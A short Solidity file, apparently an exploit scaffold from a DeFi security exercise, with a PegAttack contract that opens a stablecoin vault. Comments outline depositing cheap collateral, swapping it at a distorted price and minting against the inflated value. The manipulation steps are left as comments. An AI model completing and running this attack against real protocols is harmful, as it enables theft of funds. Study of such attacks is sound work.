
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IStable {
    function openVault() external returns (uint256);
    function depositCollateral(uint256 vaultId, address collateral, uint256 amount) external;
    function swapCollateral(uint256 vaultId, address fromCollateral, address toCollateral, uint256 amount) external;
    function mint(uint256 vaultId, uint256 amount) external;
}

contract PegAttack {
    IStable public stable;

    constructor(address _stable) {
        stable = IStable(_stable);
    }

    function attack() external returns (uint256 vaultId) {
        vaultId = stable.openVault();
        // Deposit cheap collateral, then swap at the distorted price:
        // stable.depositCollateral(vaultId, cheapToken, amount);
        // stable.swapCollateral(vaultId, cheapToken, expensiveToken, amount);
        // stable.mint(vaultId, maxBackedByInflatedValue);
    }
}
